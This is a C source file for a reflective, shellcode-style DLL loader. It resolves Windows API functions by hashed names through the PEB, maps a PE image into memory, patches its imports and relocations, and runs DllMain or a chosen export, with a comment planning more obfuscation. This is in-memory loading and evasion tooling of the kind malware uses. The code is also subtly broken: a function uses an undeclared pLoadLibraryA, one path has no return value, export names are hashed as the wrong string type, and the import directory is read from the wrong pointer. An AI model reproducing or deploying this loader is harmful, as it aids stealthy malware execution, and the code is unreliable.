#include "loader.h"
#include <windows.h>
#include <winternl.h>

void Load(PBYTE pImage, DWORD dwFunctionHash, PVOID pvUserData, DWORD dwUserDataLen, PVOID pvShellcodeBase, DWORD dwFlags)
{
    if (!pImage)
    {
        return;
    }

    /*
        1.) Locate the required functions and modules from exports with their hashed names
    */

    HMODULE hKernel32 = GetModuleAddrFromHash(KERNEL32_DLL_HASH);

    if (!hKernel32)
    {
        return;
    }

    FARPROC pLoadLibraryA = GetExportAddrFromHash(hKernel32, LOAD_LIBRARY_A_HASH);
    FARPROC pGetProcAddress = GetExportAddrFromHash(hKernel32, GET_PROC_ADDRESS_HASH);
    FARPROC pVirtualAlloc = GetExportAddrFromHash(hKernel32, VIRTUAL_ALLOC_HASH);
    FARPROC pFlushInstructionCache = GetExportAddrFromHash(hKernel32, FLUSH_INSTRUCTION_CACHE_HASH);
    FARPROC pVirtualProtect = GetExportAddrFromHash(hKernel32, VIRTUAL_PROTECT_HASH);
    FARPROC pSleep = GetExportAddrFromHash(hKernel32, SLEEP_HASH);

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc || !pFlushInstructionCache || !pVirtualProtect || !pSleep)
    {
        return;
    }

    /*
        2.) Load the target image to a newly allocated permanent memory location with RW permissions
            - https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c
    */

    PIMAGE_NT_HEADERS64 pNtHeaders = GetNtHeaders(pImage);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return;
    }

    if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        return;
    }

    if (pNtHeaders->OptionalHeader.SectionAlignment & 1)
    {
        return;
    }

    DWORD dwImageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    ULONGLONG ullPreferredImageBase = pNtHeaders->OptionalHeader.ImageBase;

    // Try to allocate the image to the preferred base address
    PBYTE pNewImageBase = (PBYTE)pVirtualAlloc((LPVOID)ullPreferredImageBase, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!pNewImageBase)
    {
        // Allocate to a random address if the preferred base address is already occupied
        pNewImageBase = (PBYTE)pVirtualAlloc(NULL, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }

    CopySections(pNewImageBase, pImage, pNtHeaders);
    memcpy(pNewImageBase, pImage, pNtHeaders->OptionalHeader.SizeOfHeaders);

    /*
        3.) Process the image relocations (assumes the image couldn't be loaded to the preferred base address)
    */

    ULONG_PTR ulpDelta = pNewImageBase - pNtHeaders->OptionalHeader.ImageBase;
    PIMAGE_DATA_DIRECTORY pDataDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (!ProcessRelocations(pNewImageBase, pDataDirectory, ulpDelta))
    {
        return;
    }

    /*
        4.) Resolve the imports by patching the Import Address Table (IAT)
    */

    if (!PatchImportAddressTable(pNewImageBase, pDataDirectory, pGetProcAddress))
    {
        return;
    }

    /*
        5.) Finalize the sections by setting protective permissions after mapping the image
    */

    FinalizeRelocations(pNewImageBase, pNtHeaders, pVirtualProtect, pFlushInstructionCache);

    /*
        6.) Execute DllMain or user defined function depending on the flag passed into the shellcode by the generator
    */

    if (dwFlags == 0)
    {
        // Execute DllMain with DLL_PROCESS_ATTACH
        DLLMAIN pDllMain = (DLLMAIN)(pNewImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        pDllMain((HINSTANCE)pNewImageBase, DLL_PROCESS_ATTACH, NULL);
    }
    else
    {
        // Execute user defined function
        FARPROC pFunction = GetExportAddrFromHash((HMODULE)pNewImageBase, dwFunctionHash);
        pFunction(pvUserData, dwUserDataLen);
    }
}

void FinalizeRelocations(PBYTE pNewImageBase, PIMAGE_NT_HEADERS64 pNtHeaders, FARPROC pVirtualProtect, FARPROC pFlushInstructionCache)
{
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; pSectionHeader++, i++)
    {
        DWORD dwOldProtect;
        DWORD dwNewProtect;

        // Definitions for readability
        DWORD dwIsExecutable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        DWORD dwIsReadable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) != 0;
        DWORD dwIsWritable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (!dwIsExecutable && !dwIsReadable && !dwIsWritable)
        {
            dwNewProtect = PAGE_NOACCESS;
        }

        if (dwIsWritable)
        {
            dwNewProtect = PAGE_WRITECOPY;
        }

        if (dwIsReadable)
        {
            dwNewProtect = PAGE_READONLY;
        }

        if (dwIsWritable && dwIsReadable)
        {
            dwNewProtect = PAGE_READWRITE;
        }

        if (dwIsExecutable)
        {
            dwNewProtect = PAGE_EXECUTE;
        }

        if (dwIsExecutable && dwIsWritable)
        {
            dwNewProtect = PAGE_EXECUTE_WRITECOPY;
        }

        if (dwIsExecutable && dwIsReadable)
        {
            dwNewProtect = PAGE_EXECUTE_READ;
        }

        if (dwIsExecutable && dwIsWritable && dwIsReadable)
        {
            dwNewProtect = PAGE_EXECUTE_READWRITE;
        }

        pVirtualProtect(pNewImageBase + pSectionHeader->VirtualAddress, pSectionHeader->SizeOfRawData, dwNewProtect, &dwOldProtect);
    }

    pFlushInstructionCache(-1, NULL, 0);
}

BOOL PatchImportAddressTable(PBYTE pNewImageBase, PIMAGE_DATA_DIRECTORY pDataDirectory, FARPROC pGetProcAddress)
{
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pNewImageBase + pDataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    if (!pImportDescriptor)
    {
        return FALSE;
    }

    /*
        TODO: obfuscate the import resolution by delaying the resolution of imports
            -> implementation stolen from https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI/ShellcodeRDI.c#L391
                1. read the IMAGE_IMPORT_DESCRIPTOR structure from the IAT
                2. calculate randomized order based on the number of imports
    */

    // DWORD dwImportCount = 0;

    while (pImportDescriptor->Name)
    {
        HMODULE hModule = pLoadLibraryA((LPCSTR)(pNewImageBase + pImportDescriptor->Name));

        if (!hModule)
        {
            return FALSE;
        }

        PIMAGE_THUNK_DATA64 pThunkData = (PIMAGE_THUNK_DATA64)(pNewImageBase + pImportDescriptor->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 pThunkDataIat = (PIMAGE_THUNK_DATA64)(pNewImageBase + pImportDescriptor->FirstThunk);

        while (pThunkData->u1.Function)
        {
            if (pThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
            {
                // High bits masked out to get the ordinal number
                pThunkDataIat->u1.Function = (ULONGLONG)pGetProcAddress(hModule, (LPCSTR)(pThunkData->u1.Ordinal & 0xFFFF));
            }
            else
            {
                // The address of the imported function is stored in the IMAGE_IMPORT_BY_NAME structure
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pNewImageBase + pThunkData->u1.AddressOfData);
                pThunkDataIat->u1.Function = (ULONGLONG)pGetProcAddress(hModule, (LPCSTR)pImportByName->Name);
            }

            pThunkData++;
            pThunkDataIat++;
        }

        pImportDescriptor++;
    }

    return TRUE;
}

BOOL ProcessRelocations(PBYTE pNewImageBase, PIMAGE_DATA_DIRECTORY pDataDirectory, ULONG_PTR ulpDelta)
{
    PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)(pNewImageBase + pDataDirectory->VirtualAddress);

    if (pRelocation == NULL || pDataDirectory->Size == 0)
    {
        return FALSE;
    }

    // Upper bound to prevent accessing memory part the end of the relocation data
    DWORD dwRelocationEnd = pDataDirectory->VirtualAddress + pDataDirectory->Size;
    PIMAGE_RELOC pRelocationList;

    while (pRelocation->VirtualAddress && pRelocation->VirtualAddress <= dwRelocationEnd && pRelocation->SizeOfBlock)
    {
        pRelocationList = (PIMAGE_RELOC)(pRelocation + 1);

        while ((PBYTE)pRelocationList < (PBYTE)pRelocation + pRelocation->SizeOfBlock)
        {
            switch (pRelocationList->type)
            {
            case IMAGE_REL_BASED_DIR64:
                // Apply the difference to the 64-bit field at offset
                *(PULONG_PTR)(pNewImageBase + pRelocation->VirtualAddress + pRelocationList->offset) += ulpDelta;
                break;
            case IMAGE_REL_BASED_HIGHLOW:
                // Base relocation applies all 32 bits of the difference tothe 32-bit field at offset
                *(PULONG_PTR)(pNewImageBase + pRelocation->VirtualAddress + pRelocationList->offset) += (DWORD)ulpDelta;
                break;
            case IMAGE_REL_BASED_HIGH:
                // Base relocation adds the high 16 bits of the difference to the 16-bit field at offset
                *(PULONG_PTR)(pNewImageBase + pRelocation->VirtualAddress + pRelocationList->offset) += HIWORD(ulpDelta);
                break;
            case IMAGE_REL_BASED_LOW:
                // Base relocation adds the low 16 bits of the difference to the 16-bit field at offset
                *(PULONG_PTR)(pNewImageBase + pRelocation->VirtualAddress + pRelocationList->offset) += LOWORD(ulpDelta);
                break;
            default:
                break;
            }

            pRelocationList++;
        }

        pRelocation = (PIMAGE_BASE_RELOCATION)pRelocationList;
    }

    return TRUE;
}

void CopySections(PBYTE pNewImageBase, PVOID pImage, PIMAGE_NT_HEADERS64 pNtHeaders)
{
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    PBYTE pSectionBase, pSectionData;

    for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; pSectionHeader++, i++)
    {
        pSectionBase = pNewImageBase + pSectionHeader->VirtualAddress;
        pSectionData = pImage + pSectionHeader->PointerToRawData;

        memcpy(pSectionBase, pSectionData, pSectionHeader->SizeOfRawData);
    }
}

HMODULE GetModuleAddrFromHash(DWORD dwHash)
{
#if defined(_WIN64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PMY_PEB_LDR_DATA pLdr = pPeb->Ldr;
    PMY_LDR_DATA_TABLE_ENTRY pEntry = pLdr->InLoadOrderModuleList.Flink;
    DWORD dwModuleHash;
    UNICODE_STRING strBaseDllName;

    while (pEntry->DllBase != NULL)
    {
        strBaseDllName = pEntry->BaseDllName;
        dwModuleHash = CalculateHash(&strBaseDllName);

        if (dwModuleHash == dwHash)
        {
            return pEntry->DllBase;
        }

        pEntry = pEntry->InLoadOrderLinks.Flink;
    }

    return NULL;
}

FARPROC GetExportAddrFromHash(HMODULE hModule, DWORD dwHash)
{
    PIMAGE_NT_HEADERS64 pNtHeaders = GetNtHeaders((PBYTE)hModule);

    if (pNtHeaders == NULL)
    {
        return NULL;
    }

    IMAGE_DATA_DIRECTORY *pExportDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *pExportDirectoryData = (IMAGE_EXPORT_DIRECTORY *)((PBYTE)hModule + pExportDirectory->VirtualAddress);
    DWORD dwNameRva, dwNameHash, dwFuncRva;
    WORD wOrdinal;
    UNICODE_STRING *strBaseDllName;

    for (size_t i = 0; i < pExportDirectoryData->NumberOfNames; i++)
    {
        dwNameRva = ((DWORD *)((PBYTE)hModule + pExportDirectoryData->AddressOfNames))[i];
        strBaseDllName = (UNICODE_STRING *)((PBYTE)hModule + dwNameRva);
        dwNameHash = CalculateHash(strBaseDllName);

        if (dwNameHash == dwHash)
        {
            wOrdinal = ((WORD *)((PBYTE)hModule + pExportDirectoryData->AddressOfNameOrdinals))[i];
            dwFuncRva = ((DWORD *)((PBYTE)hModule + pExportDirectoryData->AddressOfFunctions))[wOrdinal];

            return (FARPROC)((PBYTE)hModule + dwFuncRva);
        }
    }
}

PIMAGE_NT_HEADERS64 GetNtHeaders(PBYTE pImage)
{
    IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER *)pImage;

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }

    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)(pImage + pDosHeader->e_lfanew);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }

    return pNtHeaders;
}

DWORD CalculateHash(UNICODE_STRING *baseDllName)
{
    DWORD dwHash = HASH_KEY;
    PWSTR pwszBaseDllName = baseDllName->Buffer;
    char ch;

    for (size_t i = 0; i < baseDllName->MaximumLength; i++)
    {
        ch = (char)pwszBaseDllName[i];

        if (ch == '\0')
        {
            continue;
        }

        if (ch >= 'a' && ch <= 'z')
        {
            ch -= 0x20;
        }

        dwHash = ((dwHash << 5) + dwHash) + (DWORD)ch;
    }

    return dwHash;
}
